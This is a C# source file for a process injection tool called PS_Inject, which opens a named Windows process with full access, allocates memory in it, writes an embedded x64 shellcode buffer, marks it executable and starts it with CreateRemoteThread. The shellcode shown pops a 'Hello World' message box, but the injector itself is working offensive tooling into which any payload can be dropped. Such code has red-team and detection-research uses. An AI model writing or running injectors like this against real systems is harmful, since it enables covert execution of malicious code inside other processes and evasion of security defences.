using System;
using System.Diagnostics;
using System.Runtime.InteropServices;

// https://docs.microsoft.com/en-us/windows/win32/memory/memory-protection-constants
// https://docs.microsoft.com/en-us/windows/win32/procthread/process-security-and-access-rights
// https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualallocexnuma
// https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-openprocess
// https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-writeprocessmemory
// https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createremotethread

namespace PS_Inject
{
    class Program
    {
        static void Main(string[] args)
        {
            uint PROCESS_ALL_ACCESS = (uint)ProcessAccessFlags.ALL;
            uint PROCESS_READWRITE = (uint)PageProtection.READWRITE;
            uint PROCESS_EXECUTE = (uint)PageProtection.EXECUTE;
            const uint MEM_COMMIT = 0x00001000;
            const uint MEM_RESERVE = 0x00002000;

            if(args.Length < 1)
            {
                Console.WriteLine("[*] Usage: ProcessInjection.exe <process name>");
                return;
            }

            // Shellcode buf = {}
            byte[] buf = new byte[329] {
0xfc,0x48,0x81,0xe4,0xf0,0xff,0xff,0xff,0xe8,0xd0,0x00,0x00,0x00,0x41,0x51,
0x41,0x50,0x52,0x51,0x56,0x48,0x31,0xd2,0x65,0x48,0x8b,0x52,0x60,0x3e,0x48,
0x8b,0x52,0x18,0x3e,0x48,0x8b,0x52,0x20,0x3e,0x48,0x8b,0x72,0x50,0x3e,0x48,
0x0f,0xb7,0x4a,0x4a,0x4d,0x31,0xc9,0x48,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,
0x2c,0x20,0x41,0xc1,0xc9,0x0d,0x41,0x01,0xc1,0xe2,0xed,0x52,0x41,0x51,0x3e,
0x48,0x8b,0x52,0x20,0x3e,0x8b,0x42,0x3c,0x48,0x01,0xd0,0x3e,0x8b,0x80,0x88,
0x00,0x00,0x00,0x48,0x85,0xc0,0x74,0x6f,0x48,0x01,0xd0,0x50,0x3e,0x8b,0x48,
0x18,0x3e,0x44,0x8b,0x40,0x20,0x49,0x01,0xd0,0xe3,0x5c,0x48,0xff,0xc9,0x3e,
0x41,0x8b,0x34,0x88,0x48,0x01,0xd6,0x4d,0x31,0xc9,0x48,0x31,0xc0,0xac,0x41,
0xc1,0xc9,0x0d,0x41,0x01,0xc1,0x38,0xe0,0x75,0xf1,0x3e,0x4c,0x03,0x4c,0x24,
0x08,0x45,0x39,0xd1,0x75,0xd6,0x58,0x3e,0x44,0x8b,0x40,0x24,0x49,0x01,0xd0,
0x66,0x3e,0x41,0x8b,0x0c,0x48,0x3e,0x44,0x8b,0x40,0x1c,0x49,0x01,0xd0,0x3e,
0x41,0x8b,0x04,0x88,0x48,0x01,0xd0,0x41,0x58,0x41,0x58,0x5e,0x59,0x5a,0x41,
0x58,0x41,0x59,0x41,0x5a,0x48,0x83,0xec,0x20,0x41,0x52,0xff,0xe0,0x58,0x41,
0x59,0x5a,0x3e,0x48,0x8b,0x12,0xe9,0x49,0xff,0xff,0xff,0x5d,0x49,0xc7,0xc1,
0x00,0x00,0x00,0x00,0x3e,0x48,0x8d,0x95,0x1a,0x01,0x00,0x00,0x3e,0x4c,0x8d,
0x85,0x31,0x01,0x00,0x00,0x48,0x31,0xc9,0x41,0xba,0x45,0x83,0x56,0x07,0xff,
0xd5,0xbb,0xe0,0x1d,0x2a,0x0a,0x41,0xba,0xa6,0x95,0xbd,0x9d,0xff,0xd5,0x48,
0x83,0xc4,0x28,0x3c,0x06,0x7c,0x0a,0x80,0xfb,0xe0,0x75,0x05,0xbb,0x47,0x13,
0x72,0x6f,0x6a,0x00,0x59,0x41,0x89,0xda,0xff,0xd5,0x48,0x65,0x6c,0x6c,0x6f,
0x20,0x57,0x6f,0x72,0x6c,0x64,0x20,0x66,0x72,0x6f,0x6d,0x20,0x4b,0x72,0x30,
0x66,0x66,0x00,0x4d,0x65,0x73,0x73,0x61,0x67,0x65,0x42,0x6f,0x78,0x00 };

            uint scSize = (uint)buf.Length;

            // Get a list of all processes under a specific name = notepad ?
            Process[] proc = Process.GetProcessesByName(args[0]);
            if (proc.Length < 1)
            { // Checking for one at least one process
                Console.WriteLine("[-] Process not found");
                return;
            }

            //Get the ID of the first process in the list
            Process procId = Process.GetProcessById(proc[0].Id);
            int pId = procId.Id;

            Console.WriteLine($"[+] Process {args[0]} ID: " + proc[0].Id);

            // Open selected process with all rights
            IntPtr openProc = OpenProcess(PROCESS_ALL_ACCESS, false, pId);

            // Allocate memory to the selected process
            IntPtr memAlloc = VirtualAllocExNuma(openProc, IntPtr.Zero, scSize, MEM_COMMIT | MEM_RESERVE,  PROCESS_READWRITE, 0x0);
            Console.WriteLine("[*] VirtualAllocExNuma: 0x{0:2X}", memAlloc);

            IntPtr lpBytes;
            // Writing the shellcode in the allocated memory space
            bool wMemProc = WriteProcessMemory(openProc, memAlloc, buf, (int)scSize, out lpBytes);
            Console.WriteLine("[*] WriteProcessMemory: " + wMemProc);


            // Cast shellcode size var to UIntPtr
            UIntPtr scPtr = (UIntPtr)scSize;
            uint oldProtect;

            // Set execution flag to the allocated memory for the shellcode
            bool vProtect = VirtualProtectEx(openProc, memAlloc, scPtr, PROCESS_EXECUTE, out oldProtect);
            if (vProtect == false)
            {
                Console.WriteLine("[-] Couldn't set execution context for the shellcode");
                return;
            }
            Console.WriteLine("[*] VirtualProtectEx: " + vProtect);

            // Creating remote thread in the specified process and running shellcode
            IntPtr cThread = CreateRemoteThread(openProc, IntPtr.Zero, 0, memAlloc, IntPtr.Zero, 0, IntPtr.Zero);
            Console.WriteLine("[*] CreateRemoteThread: 0x{0:2X}", cThread);

        }

        [Flags]
        public enum ProcessAccessFlags : uint
        {
            ALL = 0x001F0FFF,
            PROCESS_TERMINATE = 0x00000001,
            PROCESS_CREATE_THREAD = 0x00000002,
            PROCESS_VM_OPERATION = 0x00000008,
            PROCESS_VM_READ = 0x00000010,
            PROCESS_VM_WRITE = 0x00000020,
            PROCESS_DUP_HANDLE = 0x00000040,
            PROCESS_CREATE_PROCESS = 0x000000080,
            PROCESS_SET_QUOTA = 0x00000100,
            PROCESS_SET_INFORMATION = 0x00000200,
            PROCESS_QUERY_INFORMATION = 0x00000400,
            PROCESS_QUERY_LIMITED_INFORMATION = 0x00001000,
            SYNCHRONIZE = 0x00100000
        }

        // Memory protection constants
        [Flags]
        enum PageProtection : uint
        {
            NOACCESS = 0x01,
            READONLY = 0x02,
            READWRITE = 0x04,
            WRITECOPY = 0x08,
            EXECUTE = 0x10,
            EXECUTE_READ = 0x20,
            EXECUTE_READWRITE = 0x40,
            EXECUTE_WRITECOPY = 0x80,
            GUARD = 0x100,
            NOCACHE = 0x200,
            WRITECOMBINE = 0x400,
        }


        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        private static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int processId);

        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        private static extern IntPtr VirtualAllocExNuma(IntPtr hProcess, IntPtr lpAddress, uint dwSize, UInt32 flAllocationType, UInt32 flProtect, UInt32 nndPreferred);

        [DllImport("kernel32.dll")]
        private static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);

        [DllImport("kernel32.dll")]
        private static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

        [DllImport("kernel32.dll")]
        private static extern bool VirtualProtectEx(IntPtr hProcess, IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
    }
}
